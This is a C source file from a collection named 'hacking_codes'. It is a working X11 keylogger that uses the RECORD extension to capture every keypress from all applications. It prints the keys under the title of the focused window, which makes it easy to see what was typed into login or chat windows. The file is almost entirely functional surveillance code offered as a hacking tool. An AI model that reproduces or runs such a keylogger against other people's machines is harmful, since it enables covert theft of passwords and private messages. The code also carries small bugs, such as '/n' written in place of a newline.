/*
 * This file is part of hacking_codes.
 * Copyright (c) pico 2016
 *
 * This program is free software: you can redistribute
 * it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this Program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


/* Based on code from:
 * https://github.com/nibrahim/showkeys/blob/master/tests/record-example.c */

#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>

#include <unistd.h>

#include <X11/X.h>
#include <X11/Xlibint.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Intrinsic.h>
#include <X11/cursorfont.h>
#include <X11/keysymdef.h>
#include <X11/keysym.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>



/* for this struct, refer to libxnee */
typedef union {
  unsigned char    type ;
  xEvent           event ;
  xResourceReq     req   ;
  xGenericReply    reply ;
  xError           error ;
  xConnSetupPrefix setup;
} XRecordDatum;

/*
 * FIXME: We need define a private struct for callback function,
 * to store cur_x, cur_y, data_disp, ctrl_disp etc.
 */
Display *data_disp = NULL;
Display *ctrl_disp = NULL;
Display *query_disp = NULL;

/* stop flag */
int stop = 0;

void event_callback (XPointer, XRecordInterceptData*);


static char _wn[4096];

/* Find window name */
int
get_window_name (Window w)
{
  XTextProperty tp;
  char *aux;
  
  if (!XGetWMName (query_disp, w, &tp)) /* Get window name if any */
    { 
      return -1;
    } 
  else if (tp.nitems > 0) 
    {
      aux = _wn;
      {
	int count = 0, i, ret;
	char **list = NULL;
	
	ret = XmbTextPropertyToTextList (query_disp, &tp, &list, &count);
	if ((ret == Success || ret > 0) && list != NULL)
	  {
	    for(i = 0; i < count; i++)
	      aux += sprintf (aux, "%s", list[i]);
	    XFreeStringList (list);
	} 
	else 
	  {
	    aux += sprintf (aux, "%s", tp.value);
	  }
      }
      
    }
  return 0;
}

/* Find the name of a specific window through the window hierarchy */
int
find_window_name (Window w, Window target)
{
  Window parent, *children;
  unsigned int nchildren;
  int stat, i;


  get_window_name (w);
  if (w == target) return 1;

  stat = XQueryTree (query_disp, w, &w, &parent, &children, &nchildren);
  if (stat == FALSE)
   {
     fprintf(stderr, "Can't query window tree...\n");
     return 0;
   }

  if (nchildren == 0)
    {
      return 0;
    }


  for (i = 0; i < nchildren; i++)
   {
     if (find_window_name (children[i], target)) return 1;
   }

  XFree ((char *)children);

  return 0;
}

int 
main (int argc, char **argv)
{
  ctrl_disp = XOpenDisplay (NULL);
  data_disp = XOpenDisplay (NULL);
  query_disp = ctrl_disp;

  if (!ctrl_disp || !data_disp) 
    {
      fprintf (stderr, "Error to open local display!/n");
      exit (1);
    }
  
  /*
   * we must set the ctrl_disp to sync mode, or, when we the enalbe
   * context in data_disp, there will be a fatal X error !!!
   */
  XSynchronize (ctrl_disp, True);
  
  int major, minor;
  if (!XRecordQueryVersion (ctrl_disp, &major, &minor)) 
    {
      fprintf (stderr, "RECORD extension not supported on this X server!/n");
      exit (2);
    }
  
  printf ("RECORD extension for local server is version is %d.%d/n", major, minor);

  XRecordRange  *rr;
  XRecordClientSpec  rcs;
  XRecordContext   rc;

  rr = XRecordAllocRange ();
  if (!rr) 
    {
      fprintf (stderr, "Could not alloc record range object!/n");
      exit (3);
    }

  rr->device_events.last = FocusIn;
  rr->device_events.first = KeyPress;
  rcs = XRecordAllClients;

  rc = XRecordCreateContext (ctrl_disp, 0, &rcs, 1, &rr, 1);
  if (!rc) 
    {
      fprintf (stderr, "Could not create a record context!/n");
      exit (4);
    }
  
  if (!XRecordEnableContextAsync (data_disp, rc, event_callback, NULL)) 
    {
      fprintf (stderr, "Cound not enable the record context!/n");
      exit (5);
    }

  while (stop != 1) 
    {
      XRecordProcessReplies (data_disp);
      usleep (100);
    }
  
  XRecordDisableContext (ctrl_disp, rc);
  XRecordFreeContext (ctrl_disp, rc);
  XFree (rr);
 
  XCloseDisplay (data_disp);
  XCloseDisplay (ctrl_disp);

  return 0;
}

static   Window old,current;
static   char wn[4096];

void event_callback(XPointer priv, XRecordInterceptData *hook)
{
  /* FIXME: we need use XQueryPointer to get the first location */
  int  revert_to;
  char *string;

  if (hook->category != XRecordFromServer) 
    {
      XRecordFreeData (hook);
      return;
    }

  XRecordDatum *data = (XRecordDatum*) hook->data;
  // Check /usr/include/X11/XProto.h for event definitions
  int event_type = data->type;
  BYTE keycode, mask;

  keycode = data->event.u.u.detail;
  mask = data->event.u.keyButtonPointer.state;

  XGetInputFocus (query_disp, &current, &revert_to);
  

  if (current && current != old)
    {
      memset (_wn, 0, 4096);
      find_window_name (DefaultRootWindow(query_disp), current);
      strcpy (wn, _wn);
      printf ("\n%s(0x%p):\n-----------------------------------\n", wn, (void*) current);
      old = current;
    }
  
  switch (event_type) 
    {
    case FocusIn:
      current = data->event.u.focus.window;
      
      break;

    case KeyPress:
      {
	/* if escape is pressed, stop the loop and clean up, then exit */
	if (keycode == 9) stop = 1;
	
	/* Note: you should not use data_disp to do normal X operations !!!*/
	string =  XKeysymToString(XKeycodeToKeysym(query_disp, keycode, mask)) ;
	
	if (string==NULL) printf ("<<UK:%d>>", keycode);
	else if (!strcmp (string, "Return"))
	  printf("\n");
	else if (!strcmp (string, "at"))
	  printf("@");
	
	else if (strlen(string) == 1)
	  printf("%s", string);
	else
	  printf("<<%s>>", string);
	
	
	break;
      }
    default:
      break;
    }
  fflush (stdout);
  
  
  XRecordFreeData (hook);
}



//  gcc -o record record.c -lX11 -lXtst

